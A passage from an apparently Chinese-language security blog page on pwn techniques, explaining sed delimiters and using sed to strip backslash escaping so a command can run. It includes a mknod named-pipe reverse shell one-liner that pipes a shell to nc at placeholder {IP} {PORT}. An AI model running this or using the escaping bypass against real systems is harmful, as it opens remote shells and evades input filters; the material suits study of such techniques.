+<p>为了避免对斜杠进行转义，可以使用其他分隔符。常见的替代分隔符包括 <code>#</code>、<code>|</code>、<code>@</code> 等。<code>sed</code> 允许使用任何非字母数字的字符作为分隔符。</p>
+<ol>
+<li><p>使用<code>#</code>作为分隔符：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&#x27;s#/home/user#/root/admin#&#x27;</span> filename</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>使用<code>|</code>作为分隔符：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&#x27;s|/home/user|/root/admin|&#x27;</span> filename</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="删除反斜杠"><a href="#删除反斜杠" class="headerlink" title="删除反斜杠"></a>删除反斜杠</h2><p>回到最开始的话题,当存在反斜杠转义时命令执行受到干扰,我们可以通过sed来绕过</p>
+<p>例如之前的mknod方式可以这样绕过</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -f /tmp/f</span><br><span class="line"><span class="built_in">mknod</span> /tmp/f p</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;cat /tmp/f|sh -i 2&gt;&amp;1|nc &#123;IP&#125; &#123;PORT&#125; &gt;/tmp/f&#x27;</span> &gt; revshell.sh</span><br><span class="line">sed -i \<span class="string">&#x27;s/\\//g\&#x27;</span> revshell.sh</span><br><span class="line">sh revshell.sh</span><br></pre></td></tr></table></figure>
+</div></div><div class="aside-content" id="aside-content"><div class="card-widget card-author"><div class="item-headline"><i class="fa-solid fa-circle-user"></i><span>Author</span></div><div class="author-main-content"><div class="author-check-content"><label class="author-info" for="author-info">     <input id="author-info" type="checkbox" name="author-info"/><div class="author-avatar"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-name">ixout</div></label></div><div class="author-switch-content"><input class="switch-content" type="radio" name="switch-content" value="description"/><label class="author-description-box">      <div class="author-description"><font color="#e66b6d">十八线业余选手</font></div></label><input class="switch-content" type="radio" name="switch-content" value="social" checked="checked"/><label class="author-social-box"><a class="card-author-button" target="_blank" rel="noopener" href="https://github.com/ixout"><i class="iconfont icon-github"></i><span>Follow Me With Github</span></a><div class="social-icons"><a class="social-icon" href="https://github.com/ixout" target="_blank" title="Github"><i class="fa-brands fa-github"></i></a><a class="social-icon" href="/1425430423" target="_blank" title="QQ"><i class="fa-brands fa-qq"></i></a></div></label><input class="switch-content" type="radio" name="switch-content" value="site-data"/><label class="author-data-box"><div class="site-data"><a class="data-item" href="/archives/"><div class="data-name">文章</div><div class="data-length">58</div></a><a class="data-item" href="/tags/"><div class="data-name">标签</div><div class="data-length">64</div></a><a class="data-item" href="/categories/"><div class="data-name">分类</div><div class="data-length">5</div></a></div></label></div></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>告示牌</span></div><div class="announcement_content"><font color="＃00CED1">(º﹃º)阿巴阿巴阿巴......</font></div></div><div class="card-widget" id="card-poem"><div id="poem_sentence"></div><div id="poem_info"><div id="poem_dynasty"></div><div id="poem_author"></div></div></div><script src="https://cdn.jsdelivr.net/npm/js-heo@1.0.11/poem/jinrishici.js" charset="utf-8"></script><script type="text/javascript">jinrishici.load(function(result) {
+var sentence = document.querySelector("#poem_sentence")
+var author = document.querySelector("#poem_author")
+var dynasty = document.querySelector("#poem_dynasty")
+
+var sentenceText = result.data.content
+sentenceText = sentenceText.substr(0, sentenceText.length - 1);
+sentence.innerHTML = sentenceText
+dynasty.innerHTML = result.data.origin.dynasty
+author.innerHTML = result.data.origin.author + '《' + result.data.origin.title + '》'
+});</script><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/15971/" title="还原魔改luac"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/p45347545154796.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="还原魔改luac"/></a><div class="content"><a class="title" href="/posts/15971/" title="还原魔改luac">还原魔改luac</a><time datetime="2024-09-27T02:45:46.000Z" title="发表于 2024-09-27 10:45:46">2024-09-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/22716/" title="2024ciscn华东南pwn"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/a96d6be2655648d9ab6dc8b314f2a8d1%20(1).jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2024ciscn华东南pwn"/></a><div class="content"><a class="title" href="/posts/22716/" title="2024ciscn华东南pwn">2024ciscn华东南pwn</a><time datetime="2024-06-24T07:59:49.000Z" title="发表于 2024-06-24 15:59:49">2024-06-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/53981/" title="fuzz-in-pwn"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/a96d6be2655648d9ab6dc8b314f2a8d1%20(1).jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="fuzz-in-pwn"/></a><div class="content"><a class="title" href="/posts/53981/" title="fuzz-in-pwn">fuzz-in-pwn</a><time datetime="2024-05-12T14:29:46.000Z" title="发表于 2024-05-12 22:29:46">2024-05-12</time></div></div></div></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/pwn/" style="font-size: 1.45em; color: rgb(135, 187, 51)">pwn</a><a href="/tags/dirtypagetable/" style="font-size: 1.15em; color: rgb(33, 69, 170)">dirtypagetable</a><a href="/tags/wp/" style="font-size: 1.3em; color: rgb(77, 178, 116)">wp</a><a href="/tags/IO-FILE/" style="font-size: 1.15em; color: rgb(149, 51, 24)">IO_FILE</a><a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" style="font-size: 1.4em; color: rgb(48, 155, 113)">学习记录</a><a href="/tags/VMpwn/" style="font-size: 1.15em; color: rgb(170, 26, 119)">VMpwn</a><a href="/tags/wasm/" style="font-size: 1.15em; color: rgb(53, 78, 34)">wasm</a><a href="/tags/webpwn/" style="font-size: 1.15em; color: rgb(118, 42, 88)">webpwn</a><a href="/tags/buuctf/" style="font-size: 1.15em; color: rgb(180, 154, 97)">buuctf</a><a href="/tags/calloc/" style="font-size: 1.15em; color: rgb(88, 59, 163)">calloc</a><a href="/tags/realloc/" style="font-size: 1.15em; color: rgb(79, 70, 127)">realloc</a><a href="/tags/grpc/" style="font-size: 1.15em; color: rgb(171, 97, 121)">grpc</a><a href="/tags/protobuf/" style="font-size: 1.2em; color: rgb(67, 145, 31)">protobuf</a><a href="/tags/%E5%9F%BA%E7%A1%80/" style="font-size: 1.25em; color: rgb(19, 75, 73)">基础</a><a href="/tags/elf/" style="font-size: 1.15em; color: rgb(139, 22, 67)">elf</a><a href="/tags/%E6%8A%A5%E9%94%99/" style="font-size: 1.15em; color: rgb(86, 94, 139)">报错</a><a href="/tags/exit/" style="font-size: 1.15em; color: rgb(17, 103, 85)">exit</a><a href="/tags/pwn%E6%8A%80%E5%B7%A7/" style="font-size: 1.15em; color: rgb(133, 197, 69)">pwn技巧</a><a href="/tags/fuzz/" style="font-size: 1.15em; color: rgb(177, 131, 42)">fuzz</a><a href="/tags/IO-FILE/" style="font-size: 1.2em; color: rgb(170, 162, 168)">_IO_FILE</a><a href="/tags/ida/" style="font-size: 1.15em; color: rgb(67, 147, 67)">ida</a><a href="/tags/kernel/" style="font-size: 1.25em; color: rgb(57, 59, 58)">kernel</a><a href="/tags/how2heap/" style="font-size: 1.15em; color: rgb(167, 62, 27)">how2heap</a><a href="/tags/heap/" style="font-size: 1.2em; color: rgb(12, 137, 14)">heap</a><a href="/tags/%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5/" style="font-size: 1.15em; color: rgb(174, 20, 37)">安全检查</a><a href="/tags/glibc/" style="font-size: 1.2em; color: rgb(4, 152, 133)">glibc</a><a href="/tags/%E5%A0%86/" style="font-size: 1.35em; color: rgb(97, 148, 138)">堆</a><a href="/tags/llvm-pass/" style="font-size: 1.15em; color: rgb(109, 190, 58)">llvm-pass</a><a href="/tags/pwnable-tw/" style="font-size: 1.15em; color: rgb(1, 95, 153)">pwnable.tw</a><a href="/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" style="font-size: 1.15em; color: rgb(99, 196, 26)">刷题记录</a><a href="/tags/phppwn/" style="font-size: 1.15em; color: rgb(66, 46, 147)">phppwn</a><a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 1.15em; color: rgb(10, 136, 142)">环境搭建</a><a href="/tags/linux/" style="font-size: 1.15em; color: rgb(29, 10, 81)">linux</a><a href="/tags/%E6%9D%82%E7%83%A9/" style="font-size: 1.15em; color: rgb(0, 64, 31)">杂烩</a><a href="/tags/%E6%8A%80%E5%B7%A7/" style="font-size: 1.15em; color: rgb(164, 177, 14)">技巧</a><a href="/tags/DynELF/" style="font-size: 1.15em; color: rgb(75, 155, 42)">DynELF</a><a href="/tags/mprotect/" style="font-size: 1.15em; color: rgb(14, 92, 114)">mprotect</a><a href="/tags/vsyscall/" style="font-size: 1.15em; color: rgb(126, 88, 49)">vsyscall</a><a href="/tags/setcontext/" style="font-size: 1.15em; color: rgb(34, 123, 17)">setcontext</a><a href="/tags/pyjail/" style="font-size: 1.15em; color: rgb(10, 5, 124)">pyjail</a></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By ixout</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script defer src="/js/cursor.js"></script><script async src="/js/fps.js"></script><script async src="/js/title.js"></script><script src="/js/sun_moon.js" async></script><script async src="//at.alicdn.com/t/c/font_3930344_38rvofbfw64.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="20px" data-random="false" async="async"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --></body></html>
